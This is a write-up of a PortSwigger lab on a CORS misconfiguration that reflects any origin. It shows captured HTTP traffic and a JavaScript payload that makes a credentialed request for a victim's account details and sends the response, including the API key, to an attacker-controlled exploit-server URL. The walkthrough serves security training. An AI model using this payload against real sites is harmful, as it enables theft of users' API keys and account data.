# PortSwigger CORS Lab 1: CORS vulnerability with basic origin reflection

## Instructions

This website has an insecure CORS configuration in that it trusts all origins.

To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to your exploit server. The lab is solved when you successfully submit the administrator's API key.

You can log in to your own account using the following credentials: `wiener:peter`

## Exploit

There is a API key leaked on the `accountDetails` endpoint

![](../../../assets/screenshots/cors/Pasted%20image%2020250801141125.png)
Looking at this in the proxy shows the request and response.

```
GET /accountDetails HTTP/1.1
Host: 0a6300590490f183806703ee00fc00ea.web-security-academy.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:141.0) Gecko/20100101 Firefox/141.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br, zstd
Referer: https://0a6300590490f183806703ee00fc00ea.web-security-academy.net/my-account?id=wiener
Connection: keep-alive
Cookie: session=vkjmdpJMH5KB0bv3S6fwEs4msYf62T7O
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
X-PwnFox-Color: magenta
Priority: u=4


```

```
HTTP/1.1 200 OK
Access-Control-Allow-Credentials: true
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Connection: close
Content-Length: 149

{
	"username": "wiener",
	"email": "",
	"apikey": "o5BObzi7TrabVjCMQedPZO3Zhwams76K",
	"sessions": [
		"vkjmdpJMH5KB0bv3S6fwEs4msYf62T7O"
	]
}
```

If we send another request with an arbitrary Origin header, we see that the arbitrary value is reflected in the `Access-Control-Allow-Origin` response header. This means that a site on any origin can make requests to the vulnerable site and read the responses. 

![](../../../assets/screenshots/cors/Pasted%20image%2020250801141507.png)

We can use the payload from Payloadsallthethings at https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CORS%20Misconfiguration#origin-reflection

```javascript
var req = new XMLHttpRequest(); 
req.onload = reqListener; 
req.open('get','https://0a6300590490f183806703ee00fc00ea.web-security-academy.net/accountDetails',true); 
req.withCredentials = true;
req.send();

function reqListener() {
	location='//exploit-0a6500ab0499f17080cb0247015a00ab.exploit-server.net/log?key='+this.responseText; 
};
```

Put this in the exploit server

![](../../../assets/screenshots/cors/Pasted%20image%2020250801141839.png)

After clicking "Deliver exploit to victim", we can check the access log and find the administrator's API key.

![](../../../assets/screenshots/cors/Pasted%20image%2020250801141937.png)

After submitting the admin's API key we finish the lab. 